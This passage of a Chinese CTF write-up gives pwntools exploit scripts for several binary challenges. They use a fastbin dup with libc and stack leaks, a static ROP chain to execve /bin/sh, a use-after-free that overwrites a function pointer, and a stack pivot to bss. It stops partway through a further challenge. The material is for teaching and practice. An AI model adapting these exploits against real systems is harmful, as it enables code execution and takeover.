DATA[0xc6e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>看看hack_list的内容，第5个指针是指向我们伪造的puts，此时show puts的资料，就能把puts函数的地址泄露出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6020c0</span><br><span class="line">0x6020c0: 0x0000000000c6e010  0x0000000000c6e080</span><br><span class="line">0x6020d0: 0x0000000000c6e0f0  0x0000000000c6e160</span><br><span class="line">0x6020e0: 0x0000000000c6e1d0  0x0000000000c6e240</span><br></pre></td></tr></table></figure></p><p>stack地址泄露参考：<a href="https://github.com/Naetw/CTF-pwn-tips#leak-stack-address" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips#leak-stack-address</a> ，通过<code>environ</code>来leak，stack偏移可以本地调试计算。</p><p>由于开了canary，通过fastbin任意地址写的时候选择没有canary保护的函数，例如用了读取字符串的read_Str，通过修改ret来getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,intro)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">  p.sendlineafter(<span class="string">'age:'</span>,str(age))</span><br><span class="line">  p.sendlineafter(<span class="string">':'</span>,str(len(intro)))</span><br><span class="line">  p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">  p.send(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name) </span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'ccc'</span>)</span><br><span class="line"><span class="comment">#payload = p64(444)+'environ'.ljust(0x20,'\0')+p64(444)+p64(libc.address+0x3c92f8) # libc_argv</span></span><br><span class="line">payload = p64(<span class="number">444</span>)+<span class="string">'environ'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">444</span>)+p64(libc.symbols[<span class="string">'environ'</span>]) <span class="comment"># libc_env</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'ddd'</span>,<span class="number">444</span>,payload)</span><br><span class="line">show(<span class="string">'environ'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]environ addr :'</span>,hex(environ_addr)</span><br><span class="line">stack_off = <span class="number">0xf8</span></span><br><span class="line">stack_addr = environ_addr<span class="comment">#-0xf8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">pr = <span class="number">0x401053</span> <span class="comment"># pop rdi , ret</span></span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'B'</span>,<span class="number">2</span>,<span class="string">'B'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A</span></span><br><span class="line">add(<span class="string">'C'</span>,<span class="number">3</span>,<span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="string">'C'</span>)  <span class="comment"># C</span></span><br><span class="line">delete(<span class="string">'B'</span>)  <span class="comment"># B-&gt;C</span></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A==C-&gt;B-&gt;C</span></span><br><span class="line"></span><br><span class="line">offset1_argv = <span class="number">0x13b</span></span><br><span class="line">offset_env = <span class="number">0x13b</span>+<span class="number">16</span></span><br><span class="line">payload = p64(stack_addr-offset_env).ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>) <span class="comment">#read_str stack</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,payload)  <span class="comment">#A</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#B</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#C</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0xb</span> + p64(pr) + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="string">'G'</span>,<span class="number">6</span>,payload.ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>)) <span class="comment">#stack</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>这条题跟之前湖湘杯的一题很想，思路也是一样，程序静态编译，直接组ROPchain就好了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">64</span>]; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to my calculator (alpha version)"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( read_int_3() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3 = add_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3 = sub_804894E();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = mul_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3 = div_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v1[v2] = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result %d save success!!\n"</span>, v1[v2++]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意会覆盖到v2的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">''</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'/bin'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'//sh'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(x)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'a:'</span>,<span class="string">'0'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'b:'</span>,str(x))</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">69</span>):</span><br><span class="line">  add_save(i)</span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop)/<span class="number">4</span>):</span><br><span class="line">  add_save(u32(rop[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h3><p>提示是UAF，程序message结构体如下：</p><table><thead><tr><th>content</th><th>size</th></tr></thead><tbody><tr><td>message size</td><td>8byte</td></tr><tr><td>message addr</td><td>8byte</td></tr><tr><td>encoder</td><td>8byte</td></tr></tbody></table><p>思路是：增加一条message，然后删掉（但指针没清空），此时仍然可以编辑，编辑一个0x18大小的message，encoder修改为程序留的后门（如果没有就泄露libc地址），然后show的时候就会执行encoder位置的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./message_saver'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len, con, encoder=<span class="number">1</span>)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line">  p.sendlineafter(<span class="string">'===========\n'</span>,str(encoder))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(len, con)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x400816</span>)</span><br><span class="line">edit(<span class="number">0x18</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ascii-art-maker"><a href="#ascii-art-maker" class="headerlink" title="ascii_art_maker"></a>ascii_art_maker</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  sub_4006D6();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input the string you want to convert:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">    sub_400705(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>main函数中存在一个0x10比特的栈溢出，可以覆盖rbp和ret，不够组rop，本题需要用<strong>栈迁移</strong>(<code>stack migrate</code>)</p><p>利用步骤:</p><ol><li>伪造rbp为bss地址，然后跳回<code>read(0, &amp;buf, 0x90uLL);</code>处扩大输入，可以发现会写入bss-0x80处。</li><li>第一段rop是泄露puts地址计算libc基址，写入第二段rop到bss+0x100，最后迁移stack到这里进行getshell。填充满0x80后溢出覆盖伪造rbp为bss-0x80，迁移stack到这里执行第一段rop。</li><li>构造第二段rop写到bss+0x100，然后迁移stack到bss+0x100执行rop。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span> )</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0400A2B')</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400a93</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi = <span class="number">0x400a91</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x400640</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave = <span class="number">0x400a2b</span></span><br><span class="line">read_addr = <span class="number">0x4009fc</span></span><br><span class="line">bss = <span class="number">0x602c00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(bss) + p64(read_addr) <span class="comment"># write rop1 to bss-0x80</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0xdeadbeef</span>) + p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) <span class="comment"># leak puts</span></span><br><span class="line">rop += p64(prsi) + p64(bss+<span class="number">0x100</span>) + p64(bss+<span class="number">0x100</span>)+ p64(prdi) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) <span class="comment"># write rop2 to bss+0x100</span></span><br><span class="line">rop += p64(prbp) + p64(bss+<span class="number">0x100</span>) + p64(leave) <span class="comment">#ret to bss+0x100</span></span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>) + p64(bss<span class="number">-0x80</span>) + p64(leave) <span class="comment">#ret to bss-0x80</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(prdi) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// 